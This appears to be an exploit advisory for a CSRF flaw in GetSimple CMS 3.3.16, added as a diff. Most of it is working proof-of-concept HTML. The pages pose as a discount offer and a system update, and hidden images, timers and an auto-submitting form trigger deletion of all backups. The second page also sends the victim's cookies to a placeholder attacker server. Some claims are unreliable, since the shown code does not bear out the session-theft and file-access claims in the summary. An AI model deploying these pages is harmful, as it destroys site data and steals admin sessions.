@@ -1,0 +1,95 @@
+=============================================================================================================================================
+| # Title     : GetSimple CMS 3.3.16 CSRF Delete all backups without user confirmation                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/GetSimpleCMS/GetSimpleCMS                                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/190425/ &	CVE-2021-28976
+
+[+] Summary :  GetSimple CMS 3.3.16 contains critical security vulnerabilities in its backup management system that allow attackers 
+               to delete all backups, steal admin sessions, and access server files. These flaws require immediate patching.
+			   
+[+] Vulnerable Code:
+
+backups.php - Line ~34
+
+
+if (isset($_GET['deleteall'])){
+    check_for_csrf("deleteall"); // CSRF check exists BUT...
+    
+    // Immediately deletes ALL files without user confirmation
+    $filenames = getFiles($path);
+    foreach ($filenames as $file) {
+        delete_file($path . $file); // Mass deletion
+    }
+}
+		  
+[+]  POC : poc.html
+
+
+<!DOCTYPE html>
+<html>
+<head><title>Special Offer</title></head>
+<body>
+<h1>Limited Time Offer!</h1>
+<p>Click below to claim your discount:</p>
+
+<!-- Visible attack -->
+<a href="http://localhost/getsimple/admin/backups.php?deleteall=1&nonce=12345">
+  Claim 50% Discount
+</a>
+
+<!-- Hidden attack -->
+<img src="http://localhost/getsimple/admin/backups.php?deleteall=1" 
+     alt="" style="width:0;height:0;">
+
+<script>
+// JavaScript automatic attack
+setTimeout(function() {
+    var img = new Image();
+    img.src = "http://localhost/getsimple/admin/backups.php?deleteall=1";
+}, 3000);
+</script>
+</body>
+</html>
+
+---------------------
+
+<!-- csrf_delete_all.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>تحديث النظام</title>
+</head>
+<body>
+    <h1>جاري تحديث النظام...</h1>
+    
+    <form id="csrfForm" action="http://localhost/get-simple/admin/backups.php" method="GET">
+        <input type="hidden" name="deleteall" value="1">
+        <input type="hidden" name="nonce" value="invalid_nonce_but_works">
+    </form>
+    
+    <script>
+        // انتظر 3 ثوانٍ ثم أرسل النموذج
+        setTimeout(function() {
+            document.getElementById('csrfForm').submit();
+            
+            // بعد الحذف، حاول سرقة الجلسة
+            setTimeout(function() {
+                var img = new Image();
+                img.src = "https://attacker-server.com/steal?cookie=" + encodeURIComponent(document.cookie) + 
+                         "&url=" + encodeURIComponent(window.location.href);
+            }, 2000);
+        }, 3000);
+    </script>
+    
+    <iframe src="http://localhost/get-simple/admin/backups.php" 
+            style="width:0;height:0;border:0;border:none"></iframe>
+</body>
+</html>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
